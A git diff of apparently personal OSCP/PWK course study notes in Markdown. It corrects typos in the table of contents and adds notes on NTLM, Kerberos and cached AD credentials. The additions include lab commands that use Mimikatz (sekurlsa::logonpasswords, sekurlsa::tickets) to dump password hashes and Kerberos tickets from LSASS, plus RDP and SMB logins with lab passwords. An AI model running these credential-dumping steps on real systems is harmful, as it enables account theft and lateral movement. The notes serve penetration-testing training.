@@ -18,7 +18,7 @@
   - [18. Linux privilege escalation](#18-linux-privilege-escalation)
   - [19. Port redirection and SSH tunneling](#19-port-redirection-and-ssh-tunneling)
   - [20. Tunneling through deep packet inspectation](#20-tunneling-through-deep-packet-inspectation)
-  - [21. The metassploit framework](#21-the-metassploit-framework)
+  - [21. The metasploit framework](#21-the-metasploit-framework)
   - [22. Active directory introduction and enumeration](#22-active-directory-introduction-and-enumeration)
   - [23. Attacking active drectiory authentication](#23-attacking-active-drectiory-authentication)
   - [24. Lateral movement in active directory](#24-lateral-movement-in-active-directory)
@@ -27,7 +27,7 @@
   - [27. Assembling the pieces](#27-assembling-the-pieces)
 - [PWK-200 labs](#pwk-200-labs)  
   - [Information gathering](#information-gathering)
-  - [Introduction to web applcation attacks](#introduction-to-web-applcation-attacks)
+  - [Introduction to web application attacks](#introduction-to-web-application-attacks)
   - [Common Web Application attacks](#common-web-application-attacks)
   - [SQL injection attacks](#sql-injection-attacks)
   - [Client-site attacks](#client-site-attacks)
@@ -38,7 +38,7 @@
   - [Linux privilege escalation](#linux-privilege-escalation)
   - [Port redirection and SSH tunneling](#port-redirection-and-ssh-tunneling)
   - [Tunneling through deep packet inspectation](#tunneling-through-deep-packet-inspectation)
-  - [The metassploit framework](#the-metassploit-framework)
+  - [The metasploit framework](#the-metasploit-framework)
   - [Active directory introduction and enumeration](#active-directory-introduction-and-enumeration)
   - [Attacking active drectiory authentication](#attacking-active-drectiory-authentication)
   - [Lateral movement in active directory](#lateral-movement-in-active-directory)
@@ -1769,7 +1769,7 @@ Reference
   - another shell Connecting to HRSHARES's SMB server through the dnscat2 port forward  
     `kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234`  
 
-### 21. The metassploit framework  
+### 21. The metasploit framework  
 **Getting familiar with Metasploit**
 - **Creating and initializing the Metasploit database**  
   `sudo msfdb init`
@@ -2411,9 +2411,31 @@ Reference
   - stephanie user should be able to connect to CLIENT74, where jeffadmin has a session. jeffadmin is a part of the Domain Admins  
   
 ### 23. Attacking active drectiory authentication
-- NTLM authentication  
+- NTLM authentication
+  - client authenticates to a server by IP address instead of by hostname OR user authenticate to a hostname not registered on the Active Directory-integrated DNS server
 - Kerberos authentication
+  - NTLM (challenge-and-response) vs Kerberos (ticket system)
+  - User login → The workstation sends a **Kerberos AS-REQ** to the Key Distribution Center (KDC) on the domain controller.
+  - KDC verification → If credentials are correct, the KDC replies with an **AS-REP** containing a Ticket Granting Ticket (TGT).
+  - The TGT can then be used to request service tickets **(TGS-REQ/TGS-REP)** for accessing resources.
 - Cached AD credentials
+  - hashes are stored in the Local Security Authority Subsystem Service (LSASS)
+  - Connecting to CLIENT75 via RDP  
+    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75 /cert:ignore /drive:share,/home/kali/share`  
+  - Starting Mimikatz and enabling SeDebugPrivilege  
+    ```
+    PS C:\Tools\> .\mimikatz.exe
+    mimikatz # privilege::debug
+    ```
+  - Dump credentials > NTLM, SHA1 (user jeff, dave)  
+    `mimikatz # sekurlsa::logonpasswords`
+  - open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup  
+    `PS C:\Users\jeff> dir \\web04.corp.com\backup`  //backup_schemata.txt
+  - Extracting Kerberos tickets with mimikatz > Ticket Granting Service, Ticket Granting Ticket  
+    `mimikatz # sekurlsa::tickets`
+  - dd
+  - ddd 
+  - dd
 - Password attacks
 - AS-REP roasting
 - Kerberoasting
